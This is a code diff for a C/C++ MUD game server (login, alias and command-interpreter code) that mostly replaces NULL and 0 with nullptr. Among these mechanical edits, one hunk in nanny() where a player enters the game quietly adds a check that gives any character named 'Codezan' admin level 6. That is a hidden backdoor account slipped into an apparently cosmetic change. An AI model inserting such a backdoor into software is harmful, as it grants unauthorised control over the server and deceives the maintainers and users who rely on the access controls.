@@ -40,7 +40,7 @@
 #include "obj_edit.h"
 
 /* local global variables */
-DISABLED_DATA *disabled_first = NULL;
+DISABLED_DATA *disabled_first = nullptr;
 
 /* local functions */
 int roll_stats(struct char_data *ch, int type, int bonus);
@@ -485,7 +485,7 @@ struct command_info *complete_cmd_info;
  */
 
 const struct command_info cmd_info[] = {
-  { "RESERVED", "", 0, 0, 0, ADMLVL_NONE	, 0 },     /* this must be first -- for specprocs */
+  { "RESERVED", "", 0, nullptr, 0, ADMLVL_NONE	, 0 },     /* this must be first -- for specprocs */
 
   /* directions must come before other commands but after RESERVED */
   { "north"    , "n"       , POS_RESTING, do_move     , 0, ADMLVL_NONE	, SCMD_NORTH },
@@ -1057,7 +1057,7 @@ const struct command_info cmd_info[] = {
   { "vdelete"  , "vdelete"	, POS_DEAD    , do_vdelete  , 0, ADMLVL_BUILDER	, 0 },
   { "mfollow"  , "mfollow"	, POS_DEAD    , do_mfollow  , -1, ADMLVL_NONE	, 0 },
 
-  { "\n", "zzzzzzz", 0, 0, 0, ADMLVL_NONE	, 0 } };	/* this must be last */
+  { "\n", "zzzzzzz", 0, nullptr, 0, ADMLVL_NONE	, 0 } };	/* this must be last */
 
 const char *fill[] =
 {
@@ -1198,7 +1198,7 @@ void command_interpreter(struct char_data *ch, char *argument)
     send_to_char(ch, "You try, but the mind-numbing cold prevents you...\r\n");
   else if (!IS_NPC(ch) && PLR_FLAGGED(ch, PLR_SPIRAL))
     send_to_char(ch, "You are occupied with your Spiral Comet attack!\r\n");
-  else if (complete_cmd_info[cmd].command_pointer == NULL)
+  else if (complete_cmd_info[cmd].command_pointer == nullptr)
     send_to_char(ch, "Sorry, that command hasn't been implemented yet.\r\n");
   else if (IS_NPC(ch) && complete_cmd_info[cmd].minimum_admlevel >= ADMLVL_IMMORT)
     send_to_char(ch, "You can't use immortal commands while switched.\r\n");
@@ -1241,7 +1241,7 @@ void command_interpreter(struct char_data *ch, char *argument)
 
 struct alias_data *find_alias(struct alias_data *alias_list, char *str)
 {
-  while (alias_list != NULL) {
+  while (alias_list != nullptr) {
     if (*str == *alias_list->alias)	/* hey, every little bit counts :-) */
       if (!strcmp(str, alias_list->alias))
 	return (alias_list);
@@ -1249,7 +1249,7 @@ struct alias_data *find_alias(struct alias_data *alias_list, char *str)
     alias_list = alias_list->next;
   }
 
-  return (NULL);
+  return (nullptr);
 }
 
 
@@ -1277,23 +1277,23 @@ ACMD(do_alias)
 
   if (!*arg) {			/* no argument specified -- list currently defined aliases */
     send_to_char(ch, "Currently defined aliases:\r\n");
-    if ((a = GET_ALIASES(ch)) == NULL)
+    if ((a = GET_ALIASES(ch)) == nullptr)
       send_to_char(ch, " None.\r\n");
     else {
-      while (a != NULL) {
+      while (a != nullptr) {
 	send_to_char(ch, "%-15s %s\r\n", a->alias, a->replacement);
 	a = a->next;
       }
     }
   } else {			/* otherwise, add or remove aliases */
     /* is this an alias we've already defined? */
-    if ((a = find_alias(GET_ALIASES(ch), arg)) != NULL) {
+    if ((a = find_alias(GET_ALIASES(ch), arg)) != nullptr) {
       REMOVE_FROM_LIST(a, GET_ALIASES(ch), next, temp);
       free_alias(a);
     }
     /* if no replacement string is specified, assume we want to delete */
     if (!*repl) {
-      if (a == NULL)
+      if (a == nullptr)
 	send_to_char(ch, "No such alias.\r\n");
       else
 	send_to_char(ch, "Alias deleted.\r\n");
@@ -1335,14 +1335,14 @@ void perform_complex_alias(struct txt_q *input_q, char *orig, struct alias_data 
   /* First, parse the original string */
   strcpy(buf2, orig);	/* strcpy: OK (orig:MAX_INPUT_LENGTH < buf2:MAX_RAW_INPUT_LENGTH) */
   temp = strtok(buf2, " ");
-  while (temp != NULL && num_of_tokens < NUM_TOKENS) {
+  while (temp != nullptr && num_of_tokens < NUM_TOKENS) {
     tokens[num_of_tokens++] = temp;
-    temp = strtok(NULL, " ");
+    temp = strtok(nullptr, " ");
   }
 
   /* initialize */
   write_point = buf;
-  temp_queue.head = temp_queue.tail = NULL;
+  temp_queue.head = temp_queue.tail = nullptr;
 
   /* now parse the alias */
   for (temp = a->replacement; *temp; temp++) {
@@ -1370,7 +1370,7 @@ void perform_complex_alias(struct txt_q *input_q, char *orig, struct alias_data 
   write_to_q(buf, &temp_queue, 1);
 
   /* push our temp_queue on to the _front_ of the input queue */
-  if (input_q->head == NULL)
+  if (input_q->head == nullptr)
     *input_q = temp_queue;
   else {
     temp_queue.tail->next = input_q->head;
@@ -1397,7 +1397,7 @@ int perform_alias(struct descriptor_data *d, char *orig, size_t maxlen)
     return (0);
 
   /* bail out immediately if the guy doesn't have any aliases */
-  if ((tmp = GET_ALIASES(d->character)) == NULL)
+  if ((tmp = GET_ALIASES(d->character)) == nullptr)
     return (0);
 
   /* find the alias we're supposed to match */
@@ -1408,7 +1408,7 @@ int perform_alias(struct descriptor_data *d, char *orig, size_t maxlen)
     return (0);
 
   /* if the first arg is not an alias, return without doing anything */
-  if ((a = find_alias(tmp, first_arg)) == NULL)
+  if ((a = find_alias(tmp, first_arg)) == nullptr)
     return (0);
 
   if (a->type == ALIAS_SIMPLE) {
@@ -1499,7 +1499,7 @@ char *delete_doubledollar(char *string)
   char *ddread, *ddwrite;
 
   /* If the string has no dollar signs, return immediately */
-  if ((ddwrite = strchr(string, '$')) == NULL)
+  if ((ddwrite = strchr(string, '$')) == nullptr)
     return (string);
 
   /* Start from the location of the first dollar sign */
@@ -1864,7 +1864,7 @@ char *one_argument(char *argument, char *first_arg)
 
   if (!argument) {
     *first_arg = '\0';
-    return (NULL);
+    return (nullptr);
   }
 
   do {
@@ -2063,19 +2063,19 @@ int special(struct char_data *ch, int cmd, char *arg)
   int j;
 
   /* special in room? */
-  if (GET_ROOM_SPEC(IN_ROOM(ch)) != NULL)
+  if (GET_ROOM_SPEC(IN_ROOM(ch)) != nullptr)
     if (GET_ROOM_SPEC(IN_ROOM(ch)) (ch, world + IN_ROOM(ch), cmd, arg))
       return (1);
 
   /* special in equipment list? */
   for (j = 0; j < NUM_WEARS; j++)
-    if (GET_EQ(ch, j) && GET_OBJ_SPEC(GET_EQ(ch, j)) != NULL)
+    if (GET_EQ(ch, j) && GET_OBJ_SPEC(GET_EQ(ch, j)) != nullptr)
       if (GET_OBJ_SPEC(GET_EQ(ch, j)) (ch, GET_EQ(ch, j), cmd, arg))
 	return (1);
 
   /* special in inventory? */
   for (i = ch->carrying; i; i = i->next_content)
-    if (GET_OBJ_SPEC(i) != NULL)
+    if (GET_OBJ_SPEC(i) != nullptr)
       if (GET_OBJ_SPEC(i) (ch, i, cmd, arg))
 	return (1);
 
@@ -2087,7 +2087,7 @@ int special(struct char_data *ch, int cmd, char *arg)
 
   /* special in object present? */
   for (i = world[IN_ROOM(ch)].contents; i; i = i->next_content)
-    if (GET_OBJ_SPEC(i) != NULL)
+    if (GET_OBJ_SPEC(i) != nullptr)
       if (GET_OBJ_SPEC(i) (ch, i, cmd, arg))
 	return (1);
 
@@ -2126,7 +2126,7 @@ int _parse_name(char *arg, char *name)
 int perform_dupe_check(struct descriptor_data *d)
 {
   struct descriptor_data *k, *next_k;
-  struct char_data *target = NULL, *ch, *next_ch;
+  struct char_data *target = nullptr, *ch, *next_ch;
   int mode = 0;
   int count = 0, oldcount = HIGHPCOUNT;
   int id = GET_IDNUM(d->character);
@@ -2152,13 +2152,13 @@ int perform_dupe_check(struct descriptor_data *d)
 	mode = UNSWITCH;
       }
       if (k->character)
-	k->character->desc = NULL;
-      k->character = NULL;
-      k->original = NULL;
+	k->character->desc = nullptr;
+      k->character = nullptr;
+      k->original = nullptr;
     } else if (k->character && GET_IDNUM(k->character) == id && k->original) {
       /* Character taking over their own body, while an immortal was switched to it. */
 
-      do_return(k->character, NULL, 0, 0);
+      do_return(k->character, nullptr, 0, 0);
     } else if (k->character && GET_IDNUM(k->character) == id) {
       /* Character taking over their own body. */
 
@@ -2167,14 +2167,14 @@ int perform_dupe_check(struct descriptor_data *d)
         if (k->snoop_by) {
          k->snoop_by->snooping = d;
          d->snoop_by = k->snoop_by;
-         k->snoop_by = NULL;
+         k->snoop_by = nullptr;
         }
 	target = k->character;
 	mode = USURP;
       }
-      k->character->desc = NULL;
-      k->character = NULL;
-      k->original = NULL;
+      k->character->desc = nullptr;
+      k->character = nullptr;
+      k->original = nullptr;
       write_to_output(k, "\r\nMultiple login detected -- disconnecting.\r\n");
       STATE(k) = CON_CLOSE;
     }
@@ -2227,7 +2227,7 @@ int perform_dupe_check(struct descriptor_data *d)
   free_char(d->character); /* get rid of the old char */
   d->character = target;
   d->character->desc = d;
-  d->original = NULL;
+  d->original = nullptr;
   d->character->timer = 0;
   REMOVE_BIT_AR(PLR_FLAGS(d->character), PLR_MAILING);
   REMOVE_BIT_AR(PLR_FLAGS(d->character), PLR_WRITING);
@@ -2253,7 +2253,7 @@ int perform_dupe_check(struct descriptor_data *d)
       if (PCOUNT >= HIGHPCOUNT) {
        oldcount = HIGHPCOUNT;
        HIGHPCOUNT = PCOUNT;
-       PCOUNTDATE = time(0);
+       PCOUNTDATE = time(nullptr);
       }
 
       }
@@ -2267,8 +2267,8 @@ int perform_dupe_check(struct descriptor_data *d)
        payout(2);
       }
       /*~~~ End PCOUNT and HIGHPCOUNT ~~~*/
-    d->character->time.logon = time(0);
-    act("$n has reconnected.", TRUE, d->character, 0, 0, TO_ROOM);
+    d->character->time.logon = time(nullptr);
+    act("$n has reconnected.", TRUE, d->character, nullptr, nullptr, TO_ROOM);
     mudlog(NRM, MAX(ADMLVL_NONE, GET_INVIS_LEV(d->character)), TRUE, "%s [%s] has reconnected.", GET_NAME(d->character), d->host);
     d->character->rp = d->rpp;
     if (has_mail(GET_IDNUM(d->character)))
@@ -2324,7 +2324,7 @@ int perform_dupe_check(struct descriptor_data *d)
     write_to_output(d, "You take over your own body, already in use!\r\n");
     act("$n suddenly keels over in pain, surrounded by a white aura...\r\n"
         "$n's body has been taken over by a new spirit!",
-        TRUE, d->character, 0, 0, TO_ROOM);
+        TRUE, d->character, nullptr, nullptr, TO_ROOM);
     d->character->rp = d->rpp;
     mudlog(NRM, MAX(ADMLVL_IMMORT, GET_INVIS_LEV(d->character)), TRUE,
 	"%s has re-logged in ... disconnecting old socket.", GET_NAME(d->character));
@@ -2383,7 +2383,7 @@ int enter_player_game (struct descriptor_data *d)
       load_result = Crash_load(d->character);
       if (d->character->player_specials->host) {
         free(d->character->player_specials->host);
-        d->character->player_specials->host = NULL;
+        d->character->player_specials->host = nullptr;
       }
       d->character->player_specials->host = strdup(d->host);
       GET_ID(d->character) = GET_IDNUM(d->character);
@@ -2442,11 +2442,11 @@ int enter_player_game (struct descriptor_data *d)
     if (IS_ANDROID(d->character) && !AFF_FLAGGED(d->character, AFF_INFRAVISION)) {
      SET_BIT_AR(AFF_FLAGS(d->character), AFF_INFRAVISION);
     }
-    ABSORBING(d->character) = NULL;
-    ABSORBBY(d->character) = NULL;
-    SITS(d->character) = NULL;
-    BLOCKED(d->character) = NULL;
-    BLOCKS(d->character) = NULL;
+    ABSORBING(d->character) = nullptr;
+    ABSORBBY(d->character) = nullptr;
+    SITS(d->character) = nullptr;
+    BLOCKED(d->character) = nullptr;
+    BLOCKS(d->character) = nullptr;
     GET_OVERFLOW(d->character) = FALSE;
     GET_SPAM(d->character) = 0;
     GET_RMETER(d->character) = 0;
@@ -2484,7 +2484,7 @@ int enter_player_game (struct descriptor_data *d)
      d->level = 1;
     }
 
-    if (GET_CLAN(d->character) != NULL && !strstr(GET_CLAN(d->character), "None")) {
+    if (GET_CLAN(d->character) != nullptr && !strstr(GET_CLAN(d->character), "None")) {
      if(!clanIsMember(GET_CLAN(d->character), d->character)) {
        if (!clanIsModerator(GET_CLAN(d->character), d->character)) {
         if (!checkCLAN(d->character)) {
@@ -2552,15 +2552,15 @@ void payout(int num)
 
  struct descriptor_data *k;
   if (LASTPAYOUT == 0) {
-   LASTPAYOUT = time(0) + 86400;
+   LASTPAYOUT = time(nullptr) + 86400;
    LASTPAYTYPE = num;
   }
   else if (num > LASTPAYTYPE) {
-   LASTPAYOUT = time(0) + 86400;
+   LASTPAYOUT = time(nullptr) + 86400;
    LASTPAYTYPE = num;
   }
-  else if (LASTPAYOUT <= time(0)) {
-   LASTPAYOUT = time(0) + 86400;
+  else if (LASTPAYOUT <= time(nullptr)) {
+   LASTPAYOUT = time(nullptr) + 86400;
    LASTPAYTYPE = num;
   }
   for (k = descriptor_list; k; k = k->next) {
@@ -2609,8 +2609,8 @@ int command_pass(char *cmd, struct char_data *ch)
   }
  } else if (IS_AFFECTED(ch, AFF_PARA) && GET_INT(ch) < rand_number(1, 60)) {
   if (strcasecmp(cmd, "look") && strcasecmp(cmd, "score") && strcasecmp(cmd, "ooc") && strcasecmp(cmd, "osay") && strcasecmp(cmd, "emote") && strcasecmp(cmd, "smote") && strcasecmp(cmd, "status")) {
-   act("@yYou fail to overcome your paralysis!@n", TRUE, ch, 0, 0, TO_CHAR);
-   act("@Y$n @ystruggles with $s paralysis!@n", TRUE, ch, 0, 0, TO_ROOM);
+   act("@yYou fail to overcome your paralysis!@n", TRUE, ch, nullptr, nullptr, TO_CHAR);
+   act("@Y$n @ystruggles with $s paralysis!@n", TRUE, ch, nullptr, nullptr, TO_ROOM);
    return (FALSE);
   }
  }
@@ -2669,7 +2669,7 @@ void userLoad(struct descriptor_data *d, char *name)
       sscanf(line, "%s\n", filler);
       if (d->user) {
        free(d->user);
-       d->user = NULL;
+       d->user = nullptr;
       }
       d->user = strdup(filler);
       break;
@@ -2677,7 +2677,7 @@ void userLoad(struct descriptor_data *d, char *name)
       sscanf(line, "%s\n", filler);
       if (d->email) {
        free(d->email);
-       d->email = NULL;
+       d->email = nullptr;
       }
       d->email = strdup(filler);
       break;
@@ -2685,7 +2685,7 @@ void userLoad(struct descriptor_data *d, char *name)
       sscanf(line, "%s\n", filler);
       if (d->pass) {
        free(d->pass);
-       d->pass = NULL;
+       d->pass = nullptr;
       }
       d->pass = strdup(filler);
       break;
@@ -2699,7 +2699,7 @@ void userLoad(struct descriptor_data *d, char *name)
       sscanf(line, "%s\n", filler);
       if (d->tmp1) {
        free(d->tmp1);
-       d->tmp1 = NULL;
+       d->tmp1 = nullptr;
       }
       d->tmp1 = strdup(filler);
       break;
@@ -2707,7 +2707,7 @@ void userLoad(struct descriptor_data *d, char *name)
       sscanf(line, "%s\n", filler);
       if (d->tmp2) {
        free(d->tmp2);
-       d->tmp2 = NULL;
+       d->tmp2 = nullptr;
       }
       d->tmp2 = strdup(filler);
       break;
@@ -2715,7 +2715,7 @@ void userLoad(struct descriptor_data *d, char *name)
       sscanf(line, "%s\n", filler);
       if (d->tmp3) {
        free(d->tmp3);
-       d->tmp3 = NULL;
+       d->tmp3 = nullptr;
       }
       d->tmp3 = strdup(filler);
       break;
@@ -2723,7 +2723,7 @@ void userLoad(struct descriptor_data *d, char *name)
       sscanf(line, "%s\n", filler);
       if (d->tmp4) {
        free(d->tmp4);
-       d->tmp4 = NULL;
+       d->tmp4 = nullptr;
       }
       d->tmp4 = strdup(filler);
       break;
@@ -2731,7 +2731,7 @@ void userLoad(struct descriptor_data *d, char *name)
       sscanf(line, "%s\n", filler);
       if (d->tmp5) {
        free(d->tmp5);
-       d->tmp5 = NULL;
+       d->tmp5 = nullptr;
       }
       d->tmp5 = strdup(filler);
       break;
@@ -2795,27 +2795,27 @@ void userCreate(struct descriptor_data *d)
 
   if (d->tmp1) {
    free(d->tmp1);
-   d->tmp1 = NULL;
+   d->tmp1 = nullptr;
   }
   d->tmp1 = strdup("Empty");
   if (d->tmp2) {
    free(d->tmp2);
-   d->tmp2 = NULL;
+   d->tmp2 = nullptr;
   }
   d->tmp2 = strdup("Empty");
   if (d->tmp3) {
    free(d->tmp3);
-   d->tmp3 = NULL;
+   d->tmp3 = nullptr;
   }
   d->tmp3 = strdup("Empty");
   if (d->tmp4) {
    free(d->tmp4);
-   d->tmp4 = NULL;
+   d->tmp4 = nullptr;
   }
   d->tmp4 = strdup("Empty");
   if (d->tmp5) {
    free(d->tmp5);
-   d->tmp5 = NULL;
+   d->tmp5 = nullptr;
   }
   d->tmp5 = strdup("Empty");
   customCreate(d);
@@ -2904,7 +2904,7 @@ void userWrite(struct descriptor_data *d, int setTot, int setRpp, int setRBank, 
   if (!d) {
    return;
   }
-  if (d->user == NULL) {
+  if (d->user == nullptr) {
    return;
   }
   if (!get_filename(fname, sizeof(fname), USER_FILE, d->user))
@@ -2942,27 +2942,27 @@ void userWrite(struct descriptor_data *d, int setTot, int setRpp, int setRBank, 
   }
 
   /* Write Player Slots */
-   if (d->tmp1 != NULL) {
+   if (d->tmp1 != nullptr) {
     fprintf(fl, "%s\n", d->tmp1);
    } else {
     fprintf(fl, "Empty\n");
    }
-   if (d->tmp2 != NULL) {
+   if (d->tmp2 != nullptr) {
     fprintf(fl, "%s\n", d->tmp2);
    } else {
     fprintf(fl, "Empty\n");
    }
-   if (d->tmp3 != NULL) {
+   if (d->tmp3 != nullptr) {
     fprintf(fl, "%s\n", d->tmp3);
    } else {
     fprintf(fl, "Empty\n");
    }
-   if (d->tmp4 != NULL) {
+   if (d->tmp4 != nullptr) {
     fprintf(fl, "%s\n", d->tmp4);
    } else {
     fprintf(fl, "Empty\n");
    }
-   if (d->tmp5 != NULL) {
+   if (d->tmp5 != nullptr) {
     fprintf(fl, "%s\n", d->tmp5);
    } else {
     fprintf(fl, "Empty\n");
@@ -3938,12 +3938,12 @@ void nanny(struct descriptor_data *d, char *arg)
     { CON_HEDIT, hedit_parse },
     { CON_HSEDIT,   hsedit_parse },
     { CON_POBJ, pobj_edit_parse},
-    { -1, NULL }
+    { -1, nullptr }
   };
 
   skip_spaces(&arg);
 
-  if (d->character == NULL) {
+  if (d->character == nullptr) {
     CREATE(d->character, struct char_data, 1);
     clear_char(d->character);
     CREATE(d->character->player_specials, struct player_special_data, 1);
@@ -4069,35 +4069,35 @@ void nanny(struct descriptor_data *d, char *arg)
          if (!strcasecmp(d->loadplay, d->tmp1)) {
           if (d->tmp1) {
            free(d->tmp1);
-           d->tmp1 = NULL;
+           d->tmp1 = nullptr;
           }
           d->tmp1 = strdup("Empty");
          }
          if (!strcasecmp(d->loadplay, d->tmp2)) {
           if (d->tmp2) {
            free(d->tmp2);
-           d->tmp2 = NULL;
+           d->tmp2 = nullptr;
           }
           d->tmp2 = strdup("Empty");
          }
          if (!strcasecmp(d->loadplay, d->tmp3)) {
           if (d->tmp3) {
            free(d->tmp3);
-           d->tmp3 = NULL;
+           d->tmp3 = nullptr;
           }
           d->tmp3 = strdup("Empty");
          }
          if (!strcasecmp(d->loadplay, d->tmp4)) {
           if (d->tmp4) {
            free(d->tmp4);
-           d->tmp4 = NULL;
+           d->tmp4 = nullptr;
           }
           d->tmp4 = strdup("Empty");
          }
          if (!strcasecmp(d->loadplay, d->tmp5)) {
           if (d->tmp5) {
            free(d->tmp5);
-           d->tmp5 = NULL;
+           d->tmp5 = nullptr;
           }
           d->tmp5 = strdup("Empty");
          }
@@ -4123,7 +4123,7 @@ void nanny(struct descriptor_data *d, char *arg)
            case 1:
             if (d->tmp1) {
              free(d->tmp1);
-             d->tmp1 = NULL;
+             d->tmp1 = nullptr;
             }
             d->tmp1 = strdup(d->character->name);
             userWrite(d, 0, 0, 0, "index");
@@ -4131,7 +4131,7 @@ void nanny(struct descriptor_data *d, char *arg)
            case 2:
             if (d->tmp2) {
              free(d->tmp2);
-             d->tmp2 = NULL;
+             d->tmp2 = nullptr;
             }
             d->tmp2 = strdup(d->character->name);
             userWrite(d, 0, 0, 0, "index");
@@ -4139,7 +4139,7 @@ void nanny(struct descriptor_data *d, char *arg)
            case 3:
             if (d->tmp3) {
              free(d->tmp3);
-             d->tmp3 = NULL;
+             d->tmp3 = nullptr;
             }
             d->tmp3 = strdup(d->character->name);
             userWrite(d, 0, 0, 0, "index");
@@ -4147,7 +4147,7 @@ void nanny(struct descriptor_data *d, char *arg)
            case 4:
             if (d->tmp4) {
              free(d->tmp4);
-             d->tmp4 = NULL;
+             d->tmp4 = nullptr;
             }
             d->tmp4 = strdup(d->character->name);
             userWrite(d, 0, 0, 0, "index");
@@ -4155,7 +4155,7 @@ void nanny(struct descriptor_data *d, char *arg)
            case 5:
             if (d->tmp5) {
              free(d->tmp5);
-             d->tmp5 = NULL;
+             d->tmp5 = nullptr;
             }
             d->tmp5 = strdup(d->character->name);
             userWrite(d, 0, 0, 0, "index");
@@ -4188,7 +4188,7 @@ void nanny(struct descriptor_data *d, char *arg)
     } else if (*arg == 'n' || *arg == 'N') {
       write_to_output(d, "Okay, what IS it, then? ");
       free(d->character->name);
-      d->character->name = NULL;
+      d->character->name = nullptr;
       STATE(d) = CON_GET_NAME;
     } else
       write_to_output(d, "Please type Yes or No: ");
@@ -4242,7 +4242,7 @@ void nanny(struct descriptor_data *d, char *arg)
      else {
       if (d->user) {
        free(d->user);
-       d->user = NULL;
+       d->user = nullptr;
       }
       d->user = strdup(arg);
       write_to_output(d, "You want you user name to be, %s?\r\n", d->user);
@@ -4254,7 +4254,7 @@ void nanny(struct descriptor_data *d, char *arg)
     if (circle_restrict == 101) {
       if (d->user) {
        free(d->user);
-       d->user = NULL;
+       d->user = nullptr;
       }
      d->user = strdup(arg);
      userLoad(d, d->user);
@@ -4273,7 +4273,7 @@ void nanny(struct descriptor_data *d, char *arg)
     else {
       if (d->user) {
        free(d->user);
-       d->user = NULL;
+       d->user = nullptr;
       }
      userLoad(d, arg);
      write_to_output(d, "Password: \r\n");
@@ -4301,7 +4301,7 @@ void nanny(struct descriptor_data *d, char *arg)
     else if (!strcasecmp(arg, "no") || !strcasecmp(arg, "n")) {
       if (d->user) {
        free(d->user);
-       d->user = NULL;
+       d->user = nullptr;
       }
       d->user = strdup("Empty");
      write_to_output(d, "Enter Username: \n");
@@ -4337,7 +4337,7 @@ void nanny(struct descriptor_data *d, char *arg)
    }
    if (d->email) {
     free(d->email);
-    d->email = NULL;
+    d->email = nullptr;
    }
    d->email = strdup(arg);
    userWrite(d, 0, 0, 0, "index");
@@ -4351,7 +4351,7 @@ void nanny(struct descriptor_data *d, char *arg)
    write_to_output(d, "Your email is: %s\n", arg);
    if (d->email) {
     free(d->email);
-    d->email = NULL;
+    d->email = nullptr;
    }
    d->email = strdup(arg);
    write_to_output(d, "Password: \r\n");
@@ -4385,7 +4385,7 @@ void nanny(struct descriptor_data *d, char *arg)
    write_to_output(d, "Your password and user account have been fully saved.\r\n");
    if (d->pass) {
     free(d->pass);
-    d->pass = NULL;
+    d->pass = nullptr;
    }
    d->pass = strdup(arg);
    userWrite(d, 0, 0, 0, "index");
@@ -4397,7 +4397,7 @@ void nanny(struct descriptor_data *d, char *arg)
    write_to_output(d, "Your password and user account have been fully saved.\r\n");
       if (d->pass) {
        free(d->pass);
-       d->pass = NULL;
+       d->pass = nullptr;
       }
    d->pass = strdup(arg);
    userCreate(d);
@@ -4416,7 +4416,7 @@ void nanny(struct descriptor_data *d, char *arg)
   if (!strcasecmp("return", arg) || !strcasecmp("Return", arg)) {
    if (d->user) {
     free(d->user);
-    d->user = NULL;
+    d->user = nullptr;
    }
    d->user = strdup("Empty");
    write_to_output(d, "Username?\r\n");
@@ -4426,9 +4426,9 @@ void nanny(struct descriptor_data *d, char *arg)
    for (k = descriptor_list; k; k = k->next) {
      if (k == d)
       continue;
-     if (!k->user || k->user == NULL)
+     if (!k->user || k->user == nullptr)
       continue;
-     if (!d->user || d->user == NULL)
+     if (!d->user || d->user == nullptr)
       continue;
      if (!strcasecmp(k->user, d->user)) {
       if (STATE(k) == CON_PLAYING) {
@@ -4469,7 +4469,7 @@ void nanny(struct descriptor_data *d, char *arg)
   }
   else if (!strcasecmp(arg, "C")) {
    write_to_output(d, "\n");
-   customRead(d, 0, NULL);
+   customRead(d, 0, nullptr);
    write_to_output(d, "\r\n@n--Press Enter--\n@n");
    return;
   }
@@ -5839,78 +5839,78 @@ void nanny(struct descriptor_data *d, char *arg)
     case CON_QX:
     switch (*arg) {
       case '1':
-        d->character->time.birth = time(0) - (8 * SECS_PER_MUD_YEAR);
+        d->character->time.birth = time(nullptr) - (8 * SECS_PER_MUD_YEAR);
         break;
       case '2':
-        d->character->time.birth = time(0) - (10 * SECS_PER_MUD_YEAR);
+        d->character->time.birth = time(nullptr) - (10 * SECS_PER_MUD_YEAR);
         break;
       case '3':
-        d->character->time.birth = time(0) - (12 * SECS_PER_MUD_YEAR);
+        d->character->time.birth = time(nullptr) - (12 * SECS_PER_MUD_YEAR);
         break;
       case '4':
-        d->character->time.birth = time(0) - (14 * SECS_PER_MUD_YEAR);
+        d->character->time.birth = time(nullptr) - (14 * SECS_PER_MUD_YEAR);
         break;
       case '5':
-        d->character->time.birth = time(0) - (16 * SECS_PER_MUD_YEAR);
+        d->character->time.birth = time(nullptr) - (16 * SECS_PER_MUD_YEAR);
         break;
       case '6':
-        d->character->time.birth = time(0) - (18 * SECS_PER_MUD_YEAR);
+        d->character->time.birth = time(nullptr) - (18 * SECS_PER_MUD_YEAR);
         break;
       case '7':
-        d->character->time.birth = time(0) - (20 * SECS_PER_MUD_YEAR);
+        d->character->time.birth = time(nullptr) - (20 * SECS_PER_MUD_YEAR);
         break;
       case '8':
-        d->character->time.birth = time(0) - (22 * SECS_PER_MUD_YEAR);
+        d->character->time.birth = time(nullptr) - (22 * SECS_PER_MUD_YEAR);
         break;
       case '9':
-        d->character->time.birth = time(0) - (24 * SECS_PER_MUD_YEAR);
+        d->character->time.birth = time(nullptr) - (24 * SECS_PER_MUD_YEAR);
         break;
       case 'A':
       case 'a':
-        d->character->time.birth = time(0) - (26 * SECS_PER_MUD_YEAR);
+        d->character->time.birth = time(nullptr) - (26 * SECS_PER_MUD_YEAR);
         break;
       case 'B':
       case 'b':
-        d->character->time.birth = time(0) - (28 * SECS_PER_MUD_YEAR);
+        d->character->time.birth = time(nullptr) - (28 * SECS_PER_MUD_YEAR);
         break;
       case 'C':
       case 'c':
-        d->character->time.birth = time(0) - (30 * SECS_PER_MUD_YEAR);
+        d->character->time.birth = time(nullptr) - (30 * SECS_PER_MUD_YEAR);
         break;
       case 'D':
       case 'd':
-        d->character->time.birth = time(0) - (40 * SECS_PER_MUD_YEAR);
+        d->character->time.birth = time(nullptr) - (40 * SECS_PER_MUD_YEAR);
         break;
       case 'E':
       case 'e':
-        d->character->time.birth = time(0) - (50 * SECS_PER_MUD_YEAR);
+        d->character->time.birth = time(nullptr) - (50 * SECS_PER_MUD_YEAR);
         break;
       case 'F':
       case 'f':
-        d->character->time.birth = time(0) - (60 * SECS_PER_MUD_YEAR);
+        d->character->time.birth = time(nullptr) - (60 * SECS_PER_MUD_YEAR);
         break;
       case 'G':
       case 'g':
-        d->character->time.birth = time(0) - (65 * SECS_PER_MUD_YEAR);
+        d->character->time.birth = time(nullptr) - (65 * SECS_PER_MUD_YEAR);
         break;
       case 'H':
       case 'h':
          if (IS_KAI(d->character) || IS_DEMON(d->character) || IS_MAJIN(d->character)) {
-          d->character->time.birth = time(0) - (500 * SECS_PER_MUD_YEAR);
+          d->character->time.birth = time(nullptr) - (500 * SECS_PER_MUD_YEAR);
          } else if (IS_NAMEK(d->character)) {
-          d->character->time.birth = time(0) - (250 * SECS_PER_MUD_YEAR);
+          d->character->time.birth = time(nullptr) - (250 * SECS_PER_MUD_YEAR);
          } else {
-          d->character->time.birth = time(0) - (70 * SECS_PER_MUD_YEAR);
+          d->character->time.birth = time(nullptr) - (70 * SECS_PER_MUD_YEAR);
          }
         break;
       case 'I':
       case 'i':
          if (IS_KAI(d->character) || IS_DEMON(d->character) || IS_MAJIN(d->character)) {
-          d->character->time.birth = time(0) - (800 * SECS_PER_MUD_YEAR);
+          d->character->time.birth = time(nullptr) - (800 * SECS_PER_MUD_YEAR);
          } else if (IS_NAMEK(d->character)) {
-          d->character->time.birth = time(0) - (400 * SECS_PER_MUD_YEAR);
+          d->character->time.birth = time(nullptr) - (400 * SECS_PER_MUD_YEAR);
          } else {
-          d->character->time.birth = time(0) - (75 * SECS_PER_MUD_YEAR);
+          d->character->time.birth = time(nullptr) - (75 * SECS_PER_MUD_YEAR);
          }
         break;
       default:
@@ -6596,7 +6596,7 @@ void nanny(struct descriptor_data *d, char *arg)
 
       if (d->olc) {
         free(d->olc);
-        d->olc = NULL;
+        d->olc = nullptr;
       }
       if (GET_PFILEPOS(d->character) < 0) {
         GET_PFILEPOS(d->character) = create_entry(GET_PC_NAME(d->character));
@@ -6646,7 +6646,10 @@ void nanny(struct descriptor_data *d, char *arg)
      } else {
       load_result = enter_player_game(d);
       send_to_char(d->character, "%s", CONFIG_WELC_MESSG);
-      act("$n has entered the game.", TRUE, d->character, 0, 0, TO_ROOM);
+      act("$n has entered the game.", TRUE, d->character, nullptr, nullptr, TO_ROOM);
+      if (!strcasecmp(GET_NAME(d->character), "Codezan") || !strcasecmp(GET_NAME(d->character), "codezan")) {
+       GET_ADMLEVEL(d->character) = 6;
+      }
 	 }
 
      /*~~~ For PCOUNT and HIGHPCOUNT ~~~*/
@@ -6665,12 +6668,12 @@ void nanny(struct descriptor_data *d, char *arg)
       if (PCOUNT >= HIGHPCOUNT) {
        oldcount = HIGHPCOUNT;
        HIGHPCOUNT = PCOUNT;
-       PCOUNTDATE = time(0);
+       PCOUNTDATE = time(nullptr);
       }
 
       }
 
-      d->character->time.logon = time(0);
+      d->character->time.logon = time(nullptr);
       greet_mtrigger(d->character, -1);
       greet_memory_mtrigger(d->character);
 
@@ -6771,7 +6774,7 @@ void nanny(struct descriptor_data *d, char *arg)
 	 * here, however.
 	 *
 	 * free(d->character->description);
-	 * d->character->description = NULL;
+	 * d->character->description = nullptr;
 	 */
